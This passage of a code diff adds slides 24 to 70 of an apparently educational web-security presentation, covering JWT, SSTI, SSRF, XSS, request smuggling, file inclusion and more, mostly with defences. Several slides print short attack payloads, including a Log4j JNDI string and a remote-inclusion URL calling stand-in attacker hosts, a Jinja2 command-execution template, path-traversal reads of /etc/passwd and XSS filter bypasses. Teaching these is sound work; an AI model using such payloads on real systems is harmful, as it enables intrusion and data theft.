+                <svg width="400" height="150" viewBox="0 0 400 150">
+                    <rect x="20" y="15" width="60" height="25" fill="#2563eb"/>
+                    <text x="50" y="32" text-anchor="middle" fill="white" font-size="8">Client</text>
+                    <rect x="320" y="15" width="60" height="25" fill="#16a34a"/>
+                    <text x="350" y="32" text-anchor="middle" fill="white" font-size="8">Server</text>
+                    
+                    <path d="M50,50 L350,50" stroke="#333" stroke-width="1"/>
+                    <text x="200" y="45" text-anchor="middle" font-size="8">1. ClientHello + Key Share</text>
+                    
+                    <path d="M350,80 L50,80" stroke="#333" stroke-width="1"/>
+                    <text x="200" y="75" text-anchor="middle" font-size="8">2. ServerHello + Cert + Finished</text>
+                    
+                    <path d="M50,110 L350,110" stroke="#dc2626" stroke-width="2"/>
+                    <text x="200" y="105" text-anchor="middle" font-size="8" fill="#dc2626" font-weight="bold">3. Encrypted Application Data</text>
+                </svg>
+            </div>
+            <p><strong>Improvements:</strong> 1-RTT Handshake, Removed RSA Key Exchange, Mandatory Forward Secrecy.</p>
+        </div>
+
+        <!-- Slide 25: JWT -->
+        <div class="slide">
+            <h1>JWT Security</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Structure</h3>
+                    <pre>
+Base64(Header).Base64(Payload).Signature
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <h3>Attack Vectors</h3>
+                    <ul>
+                        <li><strong>alg=none:</strong> Remove signature check.</li>
+                        <li><strong>Weak Secret:</strong> Crack HS256 secret.</li>
+                        <li><strong>KID Injection:</strong> SQLi in header.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 26: Mass Assignment -->
+        <div class="slide">
+            <h1>API Logic: Mass Assignment</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Attack Simulation</h3>
+                    <pre>
+POST /api/register
+{ "email": "test@test.com" }
+                    </pre>
+                    <h3>Payload</h3>
+                    <pre>
+POST /api/register
+{ "email": "test@test.com", <span class="vuln">"role": "admin"</span> }
+                    </pre>
+                </div>
+                <div>
+                    <div class="box box-info">
+                        <h3>The Flaw</h3>
+                        <p>Backend binds JSON fields directly to User Object Model.</p>
+                    </div>
+                    <h3>Fix</h3>
+                    <p>Use DTO (Data Transfer Object) to whitelist allowed fields.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 27: Race Conditions -->
+        <div class="slide">
+            <h1>Business Logic: Race Conditions</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Double Spend Simulation</h3>
+                    <table class="sim-table">
+                        <tr><th>Time</th><th>Thread A</th><th>Thread B</th></tr>
+                        <tr><td>T1</td><td>Read Balance: $100</td><td>-</td></tr>
+                        <tr><td>T2</td><td>-</td><td>Read Balance: $100</td></tr>
+                        <tr><td>T3</td><td>Deduct $80 ($20)</td><td>-</td></tr>
+                        <tr><td>T4</td><td>-</td><td>Deduct $80 ($20)</td></tr>
+                        <tr><td>T5</td><td>Commit $20</td><td>Commit $20</td></tr>
+                    </table>
+                </div>
+                <div class="box box-warn">
+                    <h3>Result</h3>
+                    <p>Started with $100. Deducted $160. Final Balance $20.</p>
+                    <p><strong>Fix:</strong> Database Locking (SELECT FOR UPDATE).</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 28: Security Headers -->
+        <div class="slide">
+            <h1>Security Headers Matrix</h1>
+            <table class="sim-table">
+                <tr><th>Header</th><th>Value</th><th>Defense Mechanism</th></tr>
+                <tr><td>Content-Security-Policy</td><td>default-src 'self'</td><td>Whitelist resource loading (XSS).</td></tr>
+                <tr><td>Strict-Transport-Security</td><td>max-age=31536000</td><td>Force HTTPS (MitM).</td></tr>
+                <tr><td>X-Frame-Options</td><td>DENY</td><td>Prevent embedding (Clickjacking).</td></tr>
+                <tr><td>X-Content-Type-Options</td><td>nosniff</td><td>Respect Content-Type (Upload).</td></tr>
+            </table>
+        </div>
+
+        <!-- Slide 29: Auth -->
+        <div class="slide">
+            <h1>Authentication Best Practices</h1>
+            <div class="grid-2">
+                <div class="box box-warn">
+                    <h3>Credential Stuffing</h3>
+                    <p>Testing leaked credentials against other sites.</p>
+                    <p><em>Defense:</em> MFA, Breach Password Detection.</p>
+                </div>
+                <div class="box box-info">
+                    <h3>Rate Limiting</h3>
+                    <p>Brute Force Prevention.</p>
+                    <p><em>Implementation:</em> Token Bucket Algorithm.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 30: Supply Chain -->
+        <div class="slide">
+            <h1>Supply Chain Security</h1>
+            <div class="box box-case">
+                <span class="case-title">Real-World: SolarWinds (2020)</span>
+                <p>Build server compromised -> Backdoored update shipped to 18,000 organizations.</p>
+            </div>
+            <div class="box box-warn">
+                <span class="case-title">Real-World: Log4j (2021)</span>
+                <pre>
+ ${jndi:ldap://attacker.com/malware}
+                </pre>
+                <p>RCE in ubiquitous logging library.</p>
+            </div>
+        </div>
+
+        <!-- Slide 31: Threat Modeling -->
+        <div class="slide">
+            <h1>Threat Modeling: STRIDE</h1>
+            <div class="grid-2">
+                <div>
+                    <ul>
+                        <li><strong>S</strong>poofing: Identity theft.</li>
+                        <li><strong>T</strong>ampering: Data modification.</li>
+                        <li><strong>R</strong>epudiation: Denying actions.</li>
+                        <li><strong>I</strong>nformation Disclosure: Leaks.</li>
+                        <li><strong>D</strong>enial of Service: Availability.</li>
+                        <li><strong>E</strong>levation of Privilege: Admin access.</li>
+                    </ul>
+                </div>
+                <div class="diagram-container" style="background:white; border:none; height:130px;">
+                    <svg width="300" height="130" viewBox="0 0 300 130">
+                        <rect x="10" y="10" width="100" height="110" fill="#eff6ff" stroke="#2563eb"/>
+                        <text x="60" y="30" text-anchor="middle" font-size="9">Untrusted</text>
+                        <rect x="190" y="10" width="100" height="110" fill="#dcfce7" stroke="#16a34a"/>
+                        <text x="240" y="30" text-anchor="middle" font-size="9">Trusted</text>
+                        <path d="M110,65 L190,65" stroke="#dc2626" stroke-width="2" stroke-dasharray="4"/>
+                        <text x="150" y="85" text-anchor="middle" font-size="9" fill="#dc2626">Trust Boundary</text>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 32: SDLC -->
+        <div class="slide">
+            <h1>Secure SDLC</h1>
+            <table class="sim-table">
+                <tr><th>Phase</th><th>Activity</th><th>Tools</th></tr>
+                <tr><td>Design</td><td>Threat Modeling</td><td>STRIDE, Threat Dragon</td></tr>
+                <tr><td>Develop</td><td>Static Analysis (SAST)</td><td>SonarQube, Checkmarx</td></tr>
+                <tr><td>Test</td><td>Dynamic Analysis (DAST)</td><td>OWASP ZAP, Burp Suite</td></tr>
+                <tr><td>Deploy</td><td>Configuration Check</td><td>IaC Scanners</td></tr>
+            </table>
+        </div>
+
+        <!-- Slide 33: Logging -->
+        <div class="slide">
+            <h1>Logging & Monitoring</h1>
+            <div class="grid-2">
+                <div class="box box-info">
+                    <h3>Log This</h3>
+                    <ul>
+                        <li>Failed Logins.</li>
+                        <li>Input Validation Failures.</li>
+                        <li>Access Control Failures.</li>
+                    </ul>
+                </div>
+                <div class="box box-warn">
+                    <h3>Never Log</h3>
+                    <ul>
+                        <li>Passwords.</li>
+                        <li>Session Tokens.</li>
+                        <li>PII (unless required).</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 34: Container -->
+        <div class="slide">
+            <h1>Container Security</h1>
+            <div class="box box-case">
+                <span class="case-title">Real-World: Dirty Pipe (2022)</span>
+                <p>Linux Kernel vulnerability allowing overwriting of files, bypassing file permission checks.</p>
+                <p><strong>Impact:</strong> Container Escape to Host Root.</p>
+            </div>
+        </div>
+
+        <!-- Slide 35: File Upload -->
+        <div class="slide">
+            <h1>File Upload Vulnerabilities</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Attack Vector</h3>
+                    <pre>
+File: shell.php.jpg
+Content-Type: image/jpeg <span class="cmt">// Spoofed</span>
+<span class="cmt">// Actual content: PHP Code</span>
+                    </pre>
+                </div>
+                <div>
+                    <h3>Defense</h3>
+                    <ul>
+                        <li>Check File Magic Bytes (Headers).</li>
+                        <li>Rename file to random hash.</li>
+                        <li>Store on S3/CDN, not local disk.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 36: DNS Rebinding -->
+        <div class="slide">
+            <h1>DNS Rebinding Attack</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Simulation</h3>
+                    <table class="sim-table">
+                        <tr><th>Step</th><th>Action</th></tr>
+                        <tr><td class="sim-step">1</td><td>Attacker runs DNS server for evil.com</td></tr>
+                        <tr><td class="sim-step">2</td><td>Victim visits evil.com. DNS resolves to Public IP.</td></tr>
+                        <tr><td class="sim-step">3</td><td>DNS TTL expires. IP changes to 192.168.1.1.</td></tr>
+                        <tr><td class="sim-step">4</td><td>JS on page scans local network.</td></tr>
+                    </table>
+                </div>
+                <div class="box box-info">
+                    <h3>Result</h3>
+                    <p>Browser believes it's still on evil.com origin, but accesses internal devices.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 37: WebSocket -->
+        <div class="slide">
+            <h1>WebSocket Security</h1>
+            <h3>CSWSH (Cross-Site WebSocket Hijacking)</h3>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="cmt">// On evil.com</span>
+var ws = new WebSocket("wss://chat.com/ws");
+ws.onmessage = function(msg) {
+  <span class="cmt">// Steal data</span>
+}
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <p>Browser sends cookies for <code>chat.com</code> during handshake.</p>
+                    <h3>Defense</h3>
+                    <p>Validate <code>Origin</code> header on Upgrade request.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 38: OAuth -->
+        <div class="slide">
+            <h1>OAuth & OIDC Flaws</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Open Redirect</h3>
+                    <pre>
+/authorize?redirect_uri=
+https://app.com/callback<span class="vuln">@evil.com</span>
+                    </pre>
+                </div>
+                <div>
+                    <h3>CSRF in OAuth</h3>
+                    <p>Attacker initiates flow, victim completes login, attacker gets access.</p>
+                    <div class="box box-info">
+                        <h3>Defense</h3>
+                        <p>Strict <code>redirect_uri</code> matching. Use <code>state</code> parameter.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 39: Clickjacking -->
+        <div class="slide">
+            <h1>Clickjacking</h1>
+            <div class="diagram-container" style="background:white; height:130px; border:none;">
+                <svg width="300" height="130" viewBox="0 0 300 130">
+                    <rect x="0" y="0" width="300" height="130" fill="#f1f5f9" stroke="#333"/>
+                    <text x="150" y="15" text-anchor="middle" font-size="9">Attacker Page</text>
+                    <text x="80" y="90" fill="#dc2626" font-size="9">Click Prize!</text>
+                    <rect x="30" y="35" width="240" height="60" fill="#fff" stroke="#2563eb" opacity="0.3"/>
+                    <text x="150" y="65" text-anchor="middle" fill="#2563eb" font-size="7">Hidden Iframe (Target Site)</text>
+                    <rect x="100" y="55" width="50" height="15" fill="#16a34a"/>
+                    <text x="125" y="67" text-anchor="middle" fill="white" font-size="6">Delete</text>
+                </svg>
+            </div>
+            <p><strong>Defense:</strong> <code>X-Frame-Options: DENY</code>.</p>
+        </div>
+
+        <!-- Slide 40: CSP Deep Dive -->
+        <div class="slide">
+            <h1>CSP Deep Dive</h1>
+            <pre>
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self' https://cdn.google.com;
+  object-src 'none';
+            </pre>
+            <div class="box box-warn">
+                <h3>Bypasses</h3>
+                <p>Allowing <code>'unsafe-inline'</code> weakens protection significantly.</p>
+            </div>
+        </div>
+
+        <!-- Slide 41: Zero Trust -->
+        <div class="slide">
+            <h1>Zero Trust Architecture</h1>
+            <ul>
+                <li><strong>Verify Explicitly:</strong> Authenticate and authorize based on all available data points.</li>
+                <li><strong>Least Privilege Access:</strong> Limit user access with Just-In-Time (JIT) access.</li>
+                <li><strong>Assume Breach:</strong> Minimize blast radius. Segment access.</li>
+            </ul>
+        </div>
+
+        <!-- Slide 42: Path Traversal -->
+        <div class="slide">
+            <h1>Path Traversal</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+GET /image?file=<span class="vuln">../../../etc/passwd</span>
+                    </pre>
+                </div>
+                <div>
+                    <h3>Defense</h3>
+                    <pre>
+File f = new File(baseDir, file).getCanonicalFile();
+if (!f.getPath().startsWith(baseDir)) {
+    <span class="key">throw</span> SecurityException();
+}
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 43: LFI vs RFI -->
+        <div class="slide">
+            <h1>LFI vs RFI</h1>
+            <div class="grid-2">
+                <div class="box box-info">
+                    <h3>LFI (Local File Inclusion)</h3>
+                    <pre>
+include($_GET['file'] . ".php");
+<span class="cmt">// Payload: ?file=../../etc/passwd%00</span>
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <h3>RFI (Remote File Inclusion)</h3>
+                    <pre>
+include($_GET['page']);
+<span class="cmt">// Payload: ?page=http://evil.com/shell.txt</span>
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 44: Smuggling -->
+        <div class="slide">
+            <h1>HTTP Request Smuggling</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>CL.TE Attack</h3>
+                    <pre>
+POST / HTTP/1.1
+Host: site.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+...
+                    </pre>
+                </div>
+                <div class="box box-case">
+                    <span class="case-title">Real-World: Patreon (2018)</span>
+                    <p>Bypassing Cloudflare WAF to access internal admin panels.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 45: NoSQL -->
+        <div class="slide">
+            <h1>NoSQL Injection</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+db.users.find({ user: user, pass: pass });
+<span class="cmt">// Payload JSON:</span>
+{ "pass": { <span class="vuln">"$ne": ""</span> } }
+                    </pre>
+                </div>
+                <div class="box box-info">
+                    <p>MongoDB operators ($ne, $gt) can be injected if input types aren't validated.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 46: GraphQL -->
+        <div class="slide">
+            <h1>GraphQL Security</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Introspection</h3>
+                    <pre>
+query {
+  __schema {
+    types { name }
+  }
+}
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <h3>DoS via Deep Query</h3>
+                    <pre>
+query { user { posts { author { posts ... } } } }
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 47: Cache Poisoning -->
+        <div class="slide">
+            <h1>Web Cache Poisoning</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+GET /page HTTP/1.1
+Host: site.com
+X-Forwarded-Host: <span class="vuln">evil.com</span>
+                    </pre>
+                </div>
+                <div class="box box-info">
+                    <p>Server reflects X-Forwarded-Host in JS. Cache saves the malicious response.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 48: SSTI -->
+        <div class="slide">
+            <h1>Server-Side Template Injection (SSTI)</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Detection</h3>
+                    <pre>
+Hello <span class="vuln">{{7*7}}</span>
+<span class="cmt">// Output: Hello 49</span>
+                    </pre>
+                </div>
+                <div>
+                    <h3>RCE (Jinja2)</h3>
+                    <pre>
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 49: Regex DoS -->
+        <div class="slide">
+            <h1>ReDoS (Regex DoS)</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="cmt">// Evil Regex</span>
+/^(a+)+$/
+
+<span class="cmt">// Input</span>
+aaaaaaaaaaaaaaaaaaaaaaa!
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <p>Catastrophic backtracking. CPU spikes to 100%.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 50: Tools Recon -->
+        <div class="slide">
+            <h1>Tools: Recon & Analysis</h1>
+            <div class="grid-3">
+                <div class="box box-info"><h3>Nmap</h3><p>Network scanning.</p></div>
+                <div class="box box-info"><h3>Amass</h3><p>Subdomain enum.</p></div>
+                <div class="box box-info"><h3>Shodan</h3><p>Device discovery.</p></div>
+                <div class="box box-info"><h3>Burp Suite</h3><p>Web proxy.</p></div>
+                <div class="box box-info"><h3>OWASP ZAP</h3><p>Free scanner.</p></div>
+                <div class="box box-info"><h3>FFUF</h3><p>Fuzzing.</p></div>
+            </div>
+        </div>
+
+        <!-- Slide 51: Tools Attack -->
+        <div class="slide">
+            <h1>Tools: Exploitation</h1>
+            <div class="grid-3">
+                <div class="box box-warn"><h3>SQLMap</h3><p>SQL Injection automation.</p></div>
+                <div class="box box-warn"><h3>Hydra</h3><p>Credential stuffing.</p></div>
+                <div class="box box-warn"><h3>Metasploit</h3><p>Pentest framework.</p></div>
+                <div class="box box-warn"><h3>Ysoserial</h3><p>Deserialization payloads.</p></div>
+                <div class="box box-warn"><h3>JTR</h3><p>Password cracker.</p></div>
+                <div class="box box-warn"><h3>Impacket</h3><p>Network protocols.</p></div>
+            </div>
+        </div>
+
+        <!-- Slide 52: DOM XSS Deep Dive -->
+        <div class="slide">
+            <h1>Deep Dive: DOM-based XSS</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Vulnerable Code</h3>
+                    <pre>
+<span class="cmt">// Client-side JS</span>
+eval("var x = " + location.hash.substring(1));
+                    </pre>
+                    <h3>Payload</h3>
+                    <pre>
+https://site.com#<span class="vuln">alert(1)</span>
+                    </pre>
+                </div>
+                <div class="box box-info">
+                    <h3>Flow</h3>
+                    <p>Source (URL) -> Sink (eval). The server never sees the payload.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 53: Unicode Normalization -->
+        <div class="slide">
+            <h1>Advanced: Unicode Normalization Attacks</h1>
+            <div class="grid-2">
+                <div>
+                    <p>Attackers use different Unicode representations of characters to bypass filters.</p>
+                    <pre>
+<span class="cmt">// "FULLWIDTH LATIN SMALL LETTER A"</span>
+U+FF41 (ａ)
+<span class="cmt">// vs standard 'a'</span>
+U+0061 (a)
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <h3>Impact</h3>
+                    <p>Can bypass WAF regex checks that assume ASCII input.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 54: Subdomain Takeover -->
+        <div class="slide">
+            <h1>Subdomain Takeover</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Scenario</h3>
+                    <ol style="padding-left:15px; font-size:0.75rem;">
+                        <li>Company creates subdomain sub.site.com pointing to GitHub Pages.</li>
+                        <li>Company deletes GitHub repo but forgets DNS CNAME.</li>
+                        <li>Attacker claims the GitHub repo name.</li>
+                        <li>Attacker serves malicious content on sub.site.com.</li>
+                    </ol>
+                </div>
+                <div class="box box-warn">
+                    <h3>Risk</h3>
+                    <p>Can steal session cookies for the main domain if cookies are scoped to `.site.com`.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 55: Broken Object Level Authorization -->
+        <div class="slide">
+            <h1>API Security: BOLA</h1>
+            <p>Broken Object Level Authorization is specific to APIs.</p>
+            <div class="grid-2">
+                <div>
+                    <pre>
+GET /api/v1/users/123
+Authorization: Bearer <span class="str">user_token_123</span>
+
+<span class="cmt">// Attacker changes ID</span>
+GET /api/v1/users/456
+Authorization: Bearer <span class="str">user_token_123</span>
+                    </pre>
+                </div>
+                <div class="box box-info">
+                    <h3>Fix</h3>
+                    <p>Every endpoint must check if the authenticated user has rights to the object ID requested.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 56: Password Storage Deep Dive -->
+        <div class="slide">
+            <h1>Password Storage: Technical Deep Dive</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Why MD5 fails</h3>
+                    <p>MD5 is fast. A modern GPU can try 20 Billion MD5 hashes/second.</p>
+                    <h3>Bcrypt Work Factor</h3>
+                    <p>Bcrypt uses "cost" parameter (e.g., 12).</p>
+                    <pre>
+2^12 iterations.
+<span class="cmt">// Slows GPU to ~10,000 hashes/sec.</span>
+                    </pre>
+                </div>
+                <div>
+                    <h3>Peppering</h3>
+                    <p>Adding a secret key (pepper) to the password before hashing, stored separately from DB.</p>
+                    <pre>
+hash = bcrypt(password + pepper, 12);
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 57: HSTS -->
+        <div class="slide">
+            <h1>HSTS: Strict Transport Security</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+                    </pre>
+                </div>
+                <div>
+                    <h3>SSL Stripping Attack</h3>
+                    <p>Attacker downgrades connection from HTTPS to HTTP during initial handshake.</p>
+                    <h3>HSTS Defense</h3>
+                    <p>Browser remembers to *force* HTTPS for the domain, ignoring any HTTP links.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 58: Incident Response -->
+        <div class="slide">
+            <h1>Incident Response Basics</h1>
+            <ol style="padding-left:15px; line-height:1.4; font-size:0.8rem;">
+                <li><strong>Preparation:</strong> Have a plan, contact list, and forensic tools ready.</li>
+                <li><strong>Identification:</strong> Detect the breach via SIEM alerts or user reports.</li>
+                <li><strong>Containment:</strong> Isolate affected systems (Disconnect network, block IPs).</li>
+                <li><strong>Eradication:</strong> Remove malware, patch the vulnerability.</li>
+                <li><strong>Recovery:</strong> Restore from clean backups, monitor closely.</li>
+                <li><strong>Lessons Learned:</strong> Update policies and training.</li>
+            </ol>
+        </div>
+
+        <!-- Slide 59: DOM Clobbering -->
+        <div class="slide">
+            <h1>Advanced: DOM Clobbering</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>The Technique</h3>
+                    <p>Using HTML elements to overwrite JavaScript variables or functions.</p>
+                    <pre>
+<span class="cmt">// Attacker injects:</span>
+&lt;img id="config"&gt;
+&lt;input id="config" name="api_url" value="evil.com"&gt;
+
+<span class="cmt">// JS logic:</span>
+if (window.config.api_url) { ... }
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <h3>Result</h3>
+                    <p>JS unexpectedly uses the DOM nodes instead of the intended object.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 60: Insecure Direct Object References -->
+        <div class="slide">
+            <h1>Advanced: IDOR Patterns</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Direct Reference</h3>
+                    <pre>
+GET /pdf?file=invoice.pdf
+<span class="cmt">// Change to</span>
+GET /pdf?file=../etc/passwd
+                    </pre>
+                </div>
+                <div>
+                    <h3>Indirect Reference</h3>
+                    <pre>
+<span class="cmt">// Map internal IDs to random tokens</span>
+User ID 123 -> abcde
+User ID 124 -> fghij
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 61: Broken Authentication -->
+        <div class="slide">
+            <h1>Broken Authentication Patterns</h1>
+            <div class="grid-2">
+                <div class="box box-warn">
+                    <h3>Weak Passwords</h3>
+                    <p>Allowing "123456" or "password".</p>
+                </div>
+                <div class="box box-warn">
+                    <h3>Credential Stuffing</h3>
+                    <p>Using leaked lists against your site.</p>
+                </div>
+                <div class="box box-warn">
+                    <h3>Weak Recovery</h3>
+                    <p>"What is your favorite color?" - Easy to guess.</p>
+                </div>
+                <div class="box box-warn">
+                    <h3>Session ID in URL</h3>
+                    <p>Leaked via Referer header.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 62: XML Attacks -->
+        <div class="slide">
+            <h1>XML Attacks: Billion Laughs</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol2 "&lol;&lol;..."&gt;
+  ...
+]&gt;
+&lt;lolz&gt;&lol9;&lt;/lolz&gt;
+                    </pre>
+                </div>
+                <div class="box box-info">
+                    <h3>Impact</h3>
+                    <p>Exponential memory expansion. A few KB of XML can consume GBs of RAM.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 63: Prototype Pollution -->
+        <div class="slide">
+            <h1>JavaScript: Prototype Pollution</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="cmt">// Attacker merges object</span>
+Object.merge(target, JSON.parse('{"__proto__": {"admin": true}}'));
+
+<span class="cmt">// All objects now have admin=true</span>
+if (user.admin) { ... }
+                    </pre>
+                </div>
+                <div class="box box-warn">
+                    <h3>Impact</h3>
+                    <p>Can bypass authorization, trigger RCE in some server-side JS.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 64: Server-Side Template Injection -->
+        <div class="slide">
+            <h1>SSTI Anatomy</h1>
+            <div class="grid-2">
+                <div>
+                    <h3>Vulnerable Code (Python Flask)</h3>
+                    <pre>
+output = template.render(name=name)
+<span class="cmt">// User controls 'name' variable</span>
+                    </pre>
+                </div>
+                <div>
+                    <h3>Syntax Matrix</h3>
+                    <table class="sim-table">
+                        <tr><th>Engine</th><th>Payload</th></tr>
+                        <tr><td>Jinja2</td><td>{{config}}</td></tr>
+                        <tr><td>Twig</td><td>{{_self.env.display("id")}}</td></tr>
+                        <tr><td>Freemarker</td><td>${"freemarker..."}</td></tr>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 65: API Security -->
+        <div class="slide">
+            <h1>API Security Checklist</h1>
+            <ul>
+                <li>Authentication: JWT validation, strong secrets.</li>
+                <li>Authorization: Scope checks on every endpoint.</li>
+                <li>Rate Limiting: Prevent scraping/brute force.</li>
+                <li>Input Validation: Strict schema validation (JSON Schema).</li>
+                <li>Error Handling: Generic messages, no stack traces.</li>
+            </ul>
+        </div>
+
+        <!-- Slide 66: Broken Access Control -->
+        <div class="slide">
+            <h1>Broken Access Control Scenarios</h1>
+            <div class="grid-2">
+                <div class="box box-warn">
+                    <h3>Directory Traversal</h3>
+                    <p>Accessing files outside web root.</p>
+                </div>
+                <div class="box box-warn">
+                    <h3>Forced Browsing</h3>
+                    <p>Guessing URLs like /admin.</p>
+                </div>
+                <div class="box box-warn">
+                    <h3>Parameter Tampering</h3>
+                    <p>Changing ?role=user to ?role=admin.</p>
+                </div>
+                <div class="box box-warn">
+                    <h3>IDOR</h3>
+                    <p>Accessing other users' data by ID.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 67: SSRF Filter Bypass -->
+        <div class="slide">
+            <h1>SSRF Filter Bypass Techniques</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="cmt">// 1. Alternate IP Representation</span>
+http://2130706433/ (Decimal for 127.0.0.1)
+
+<span class="cmt">// 2. URL Parsing Issues</span>
+http://google.com@evil.com
+                    </pre>
+                </div>
+                <div>
+                    <pre>
+<span class="cmt">// 3. DNS Rebinding</span>
+IP resolves to 127.0.0.1 on 2nd request.
+
+<span class="cmt">// 4. IPv6</span>
+http://[::1]/ (Localhost IPv6)
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 68: XSS Filter Bypass -->
+        <div class="slide">
+            <h1>XSS Filter Bypass Techniques</h1>
+            <div class="grid-2">
+                <div>
+                    <pre>
+<span class="cmt">// No spaces</span>
+&lt;img/src=x onerror=alert(1)&gt;
+
+<span class="cmt">// Case mixing</span>
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+                    </pre>
+                </div>
+                <div>
+                    <pre>
+<span class="cmt">// Double Encoding</span>
+%253cscript%253ealert(1)%253c
+
+<span class="cmt">// SVG</span>
+&lt;svg onload=alert(1)&gt;
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Slide 69: Summary -->
+        <div class="slide">
+            <h1>Summary</h1>
+            <ul>
+                <li><strong>Input Validation:</strong> Never trust user data.</li>
+                <li><strong>Broken Access Control:</strong> Verify permissions on every request.</li>
+                <li><strong>Crypto:</strong> Use modern standards (TLS 1.3, bcrypt).</li>
+                <li><strong>Architecture:</strong> Defense in Depth.</li>
+                <li><strong>Supply Chain:</strong> Monitor dependencies.</li>
+                <li><strong>Mindset:</strong> Think like an attacker.</li>
+            </ul>
+        </div>
+
+        <!-- Slide 70: References -->
+        <div class="slide">
+            <h1>References</h1>
+            <div class="grid-2">
+                <div>
+                    <ul>
+                        <li><strong>OWASP:</strong> owasp.org</li>
+                        <li><strong>PortSwigger:</strong> portswigger.net/web-security</li>
+                    </ul>
+                </div>
+                <div>
+                    <ul>
+                        <li><strong>HackerOne:</strong> hackerone.com</li>
+                        <li><strong>Root-Me:</strong> root-me.org</li>
+                    </ul>
+                </div>
+            </div>
+            <div style="text-align:center; margin-top:40px;">
+                <h2>End of Presentation</h2>
+                <p>Questions?</p>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="footer">
+        <button class="nav-btn" id="prev-btn" onclick="changeSlide(-1)">❮ Prev</button>
+        <div id="slide-counter">Slide 1 / 70</div>
+        <button class="nav-btn" id="next-btn" onclick="changeSlide(1)">Next ❯</button>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        const counter = document.getElementById('slide-counter');
+        const prevBtn = document.getElementById('prev-btn');
+        const nextBtn = document.getElementById('next-btn');
+
+        function updateSlide() {
+            slides.forEach((slide, index) => {
+                slide.classList.remove('active');
+                if (index === currentSlide) slide.classList.add('active');
+            });
+            counter.textContent = `Slide ${currentSlide + 1} / ${totalSlides}`;
+            prevBtn.disabled = currentSlide === 0;
+            nextBtn.disabled = currentSlide === totalSlides - 1;
+        }
+
+        function changeSlide(direction) {
+            currentSlide += direction;
+            if (currentSlide >= totalSlides) currentSlide = totalSlides - 1;
+            if (currentSlide < 0) currentSlide = 0;
+            updateSlide();
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight' || e.key === ' ') { e.preventDefault(); changeSlide(1); } 
